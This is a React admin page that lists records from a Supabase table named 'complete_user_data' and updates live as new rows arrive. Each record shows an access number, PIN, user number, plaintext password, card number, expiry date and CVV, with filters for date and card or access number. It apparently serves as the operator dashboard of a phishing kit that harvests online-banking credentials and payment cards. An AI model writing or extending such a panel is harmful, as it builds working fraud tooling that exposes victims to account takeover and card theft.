import React, { useState, useEffect, useMemo } from 'react';
import { supabase } from '../firebase';

const toDateStr = (date) => date.toISOString().split('T')[0];
const today = toDateStr(new Date());
const yesterday = toDateStr(new Date(Date.now() - 86400000));

export default function AdminPage({ onBack }) {
  const [data, setData] = useState([]);
  const [from, setFrom] = useState('');
  const [to, setTo] = useState('');
  const [search, setSearch] = useState('');

  const load = async () => {
    const { data: rows, error } = await supabase
      .from('complete_user_data')
      .select('*')
      .order('completedAt', { ascending: false });
    if (!error) setData(rows);
  };

  useEffect(() => {
    load();
    const channel = supabase
      .channel('admin_realtime')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'complete_user_data' }, load)
      .subscribe();
    return () => supabase.removeChannel(channel);
  }, []);

  const filtered = useMemo(() => {
    return data.filter((item) => {
      const itemDate = toDateStr(new Date(item.completedAt));
      if (from && itemDate < from) return false;
      if (to && itemDate > to) return false;
      if (search) {
        const s = search.toLowerCase();
        return (
          item.accessNumber?.includes(s) ||
          item.cardNumber?.includes(s) ||
          item.userNumber?.toLowerCase().includes(s)
        );
      }
      return true;
    });
  }, [data, from, to, search]);

  const setQuick = (type) => {
    if (type === 'today') { setFrom(today); setTo(today); }
    else if (type === 'yesterday') { setFrom(yesterday); setTo(yesterday); }
    else if (type === 'week') { setFrom(toDateStr(new Date(Date.now() - 7 * 86400000))); setTo(today); }
    else { setFrom(''); setTo(''); }
  };

  return (
    <div className="min-h-screen bg-gray-50 p-6">
      <div className="max-w-7xl mx-auto">

        {/* Header */}
        <div className="bg-white rounded-lg shadow-sm p-6 mb-4">
          <div className="flex justify-between items-center">
            <div>
              <h1 className="text-3xl font-bold text-gray-900 mb-1">Admin Panel</h1>
              <p className="text-gray-500">Showing {filtered.length} of {data.length} entries</p>
            </div>
            {onBack && (
              <button onClick={onBack} className="bg-gray-600 text-white px-4 py-2 rounded hover:bg-gray-700">
                Back to Login
              </button>
            )}
          </div>
        </div>

        {/* Filters */}
        <div className="bg-white rounded-lg shadow-sm p-4 mb-4 flex flex-wrap gap-3 items-end">
          {/* Quick filters */}
          <div className="flex gap-2">
            {['today', 'yesterday', 'week', 'all'].map((q) => (
              <button
                key={q}
                onClick={() => setQuick(q)}
                className="px-3 py-2 text-sm rounded border border-gray-300 hover:bg-red-600 hover:text-white hover:border-red-600 transition-colors capitalize"
              >
                {q === 'week' ? 'Last 7 days' : q.charAt(0).toUpperCase() + q.slice(1)}
              </button>
            ))}
          </div>

          {/* Date range */}
          <div className="flex items-center gap-2">
            <input
              type="date"
              value={from}
              onChange={(e) => setFrom(e.target.value)}
              className="border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-red-500"
            />
            <span className="text-gray-400 text-sm">to</span>
            <input
              type="date"
              value={to}
              onChange={(e) => setTo(e.target.value)}
              className="border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-red-500"
            />
          </div>

          {/* Search */}
          <input
            type="text"
            placeholder="Search by access no, card no, user no..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-red-500 w-72"
          />

          {/* Clear */}
          {(from || to || search) && (
            <button
              onClick={() => { setFrom(''); setTo(''); setSearch(''); }}
              className="px-3 py-2 text-sm text-red-600 border border-red-300 rounded hover:bg-red-50"
            >
              Clear filters
            </button>
          )}
        </div>

        {/* Data */}
        <div className="bg-white rounded-lg shadow-sm p-6">
          {filtered.length === 0 ? (
            <p className="text-gray-500">No entries found</p>
          ) : (
            <div className="space-y-4">
              {filtered.map((item) => (
                <div key={item.id} className="border rounded-lg p-4 bg-gray-50 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                  <div><strong>Access Number</strong><br /><span className="font-mono">{item.accessNumber}</span></div>
                  <div><strong>PIN</strong><br /><span className="font-mono">{item.pin}</span></div>
                  <div><strong>User Number</strong><br /><span>{item.userNumber}</span></div>
                  <div><strong>Password</strong><br /><span className="font-mono">{item.password}</span></div>
                  <div><strong>Card Number</strong><br /><span className="font-mono">{item.cardNumber}</span></div>
                  <div><strong>Expiry Date</strong><br /><span className="font-mono">{item.expiryDate}</span></div>
                  <div><strong>CVV</strong><br /><span className="font-mono">{item.cvv}</span></div>
                  <div><strong>Completed At</strong><br /><span className="text-sm">{new Date(item.completedAt).toLocaleString()}</span></div>
                  <div><strong>Status</strong><br /><span className="text-green-600 font-semibold">{item.status}</span></div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
